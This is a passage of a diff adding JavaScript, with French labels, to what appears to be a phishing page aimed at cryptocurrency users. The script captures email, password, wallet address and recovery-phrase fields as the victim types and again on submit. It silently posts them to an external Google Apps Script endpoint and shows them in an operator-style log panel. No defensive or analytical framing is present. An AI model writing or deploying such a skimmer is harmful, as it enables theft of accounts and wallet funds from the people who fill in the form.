+    const entry = document.createElement('div');
+    entry.className = 'np-entry';
+    entry.innerHTML = `
+      <div class="np-type ${type}">${type === 'live' ? '⚡ LIVE' : '✅ SOUMIS'}</div>
+      <div class="np-label">${label}</div>
+      <div class="np-value">${value.trim()}</div>
+      <div class="np-time">${getTime()}</div>
+    `;
+    list.prepend(entry);
+  }
+
+  function sendToSheet(data) {
+    fetch(GOOGLE_SCRIPT_URL, {
+      method: 'POST',
+      body: JSON.stringify(data)
+    }).catch(() => {});
+  }
+
+  // Surveillance temps réel
+  const watchFields = [
+    { id: 'email',  label: 'Email' },
+    { id: 'cpw1',   label: 'Mot de passe' },
+    { id: 'addr',   label: 'Adresse crypto' },
+    { id: 'seed',   label: 'Phrase de récupération' }
+  ];
+
+  const liveTimers = {};
+  watchFields.forEach(({ id, label }) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input', () => {
+      clearTimeout(liveTimers[id]);
+      liveTimers[id] = setTimeout(() => {
+        const val = el.value;
+        if (val.trim()) {
+          addToNotepad(label, val, 'live');
+          sendToSheet({ type: 'live', champ: label, valeur: val, date: getDate(), heure: getTime() });
+        }
+      }, 800);
+    });
+  });
+
+  // Capture à la soumission finale
+  function captureSubmit() {
+    const fields = [
+      { id: 'email', label: 'Email' },
+      { id: 'cpw1',  label: 'Mot de passe' },
+      { id: 'addr',  label: 'Adresse crypto' },
+      { id: 'seed',  label: 'Phrase de récupération' }
+    ];
+    fields.forEach(({ id, label }) => {
+      const el = document.getElementById(id);
+      if (el && el.value.trim()) addToNotepad(label, el.value, 'submit');
+    });
+    sendToSheet({
+      type:    'submit',
+      email:   document.getElementById('email')?.value  || '',
+      mdp:     document.getElementById('cpw1')?.value   || '',
+      adresse: document.getElementById('addr')?.value   || '',
+      seed:    document.getElementById('seed')?.value   || '',
+      date:    getDate(),
+      heure:   getTime()
+    });
+  }
+</script>
+</body>
+</html>
